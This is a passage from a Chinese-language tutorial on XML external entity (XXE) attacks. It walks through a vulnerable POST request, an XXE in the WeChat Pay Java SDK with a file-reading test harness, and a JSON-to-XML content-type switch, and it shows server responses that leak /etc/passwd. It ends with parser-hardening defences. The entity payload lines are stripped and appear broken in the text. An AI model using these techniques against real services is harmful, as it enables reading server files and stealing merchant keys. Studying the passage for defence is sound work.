**示例代码：**
    POST /vulnerable HTTP/1.1
    Host: www.test.com
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Referer: https://test.com/test.html
    Content-Type: application/xml
    Content-Length: 294
    Cookie: mycookie=cookies;
    Connection: close
    Upgrade-Insecure-Requests: 1
          John, Doe
          I love XML
          Computers
          9.99
          2018-10-01
          XML is the best!
我们发出 带有 xml 的 POST 请求以后，述代码将交由服务器的XML处理器解析。代码被解释并返回：{“Request Successful”:
“Added!”}
但是如果我们传入一个恶意的代码
    ]>
          John, Doe
          I love XML
          Computers
          9.99
          2018-10-01
          &xxe;
如果没有做好“安全措施” 就会出现解析恶意代码的情况，就会有下面的返回
    {"error": "no results for description root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync...
### **实例二：微信支付的 XXE**
前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，
**漏洞描述：**
微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java
sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据
(md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品
我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil
工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中
**如图所示：**
问题就出现在我横线划出来的那部分，也就是简化为下面的代码：
    public static Map xmlToMap(String strXML) throws Exception {
            try {
                Map data = new HashMap();
                DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();
                InputStream stream = new ByteArrayInputStream(strXML.getBytes("UTF-8"));
                org.w3c.dom.Document doc = documentBuilder.parse(stream);
                ...
我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML 解析了，而不巧的是 strXML
是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤
首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java
**如图所示：**
**test001.java**
    package com.test.test001;
    import java.util.Map;
    import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;
    public class test001 {
        public static void main(String args[]) throws Exception {
            String xmlStr ="\r\n" +
                    "]>\r\n" +
                    "\r\n"+
                    "&xxe;\r\n" +
                    "";
            try{
                Map test = xmlToMap(xmlStr);
                System.out.println(test);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
我希望它能读取我 D 盘下面的 1.txt 文件
运行后成功读取
**如图所示：**
当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的
    http://apache.org/xml/features/disallow-doctype-decl true
    http://apache.org/xml/features/nonvalidating/load-external-dtd false
    http://xml.org/sax/features/external-general-entities false
    http://xml.org/sax/features/external-parameter-entities false
整个源码我打包好了已经上传到我的百度云，有兴趣的童鞋可以运行一下感受：
> 链接： 提取码：xq1b
上面说过 java 中有一个 netdoc:/ 协议能代替 file:/// ,我现在来演示一下：
**如图所示：**
### **实例三：JSON content-type XXE**
正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击
#### **原始请求和响应：**
**HTTP Request:**
    POST /netspi HTTP/1.1
    Host: someserver.netspi.com
    Accept: application/json
    Content-Type: application/json
    Content-Length: 38
    {"search":"name","value":"netspitest"}
**HTTP Response:**
    HTTP/1.1 200 OK
    Content-Type: application/json
    Content-Length: 43
    {"error": "no results for name netspitest"}
现在我们尝试将 Content-Type 修改为 application/xml
#### **进一步请求和响应：**
**HTTP Request:**
    POST /netspi HTTP/1.1
    Host: someserver.netspi.com
    Accept: application/json
    Content-Type: application/xml
    Content-Length: 38
    {"search":"name","value":"netspitest"}
**HTTP Response:**
    HTTP/1.1 500 Internal Server Error
    Content-Type: application/json
    Content-Length: 127
    {"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}
可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击
#### **最终的请求和响应：**
**HTTP Request:**
    POST /netspi HTTP/1.1
    Host: someserver.netspi.com
    Accept: application/json
    Content-Type: application/xml
    Content-Length: 288
    ]>
    name
    &xxe;
**HTTP Response:**
    HTTP/1.1 200 OK
    Content-Type: application/json
    Content-Length: 2467
    {"error": "no results for name root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync....
## **六、XXE 如何防御**
### **方案一：使用语言中推荐的禁用外部实体的方法**
**PHP：**
    libxml_disable_entity_loader(true);
**JAVA:**
    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    dbf.setExpandEntityReferences(false);
    .setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
    .setFeature("http://xml.org/sax/features/external-general-entities",false)
    .setFeature("http://xml.org/sax/features/external-parameter-entities",false);
**Python：**
    from lxml import etree
    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
### **方案二：手动黑名单过滤(不推荐)**
过滤关键词：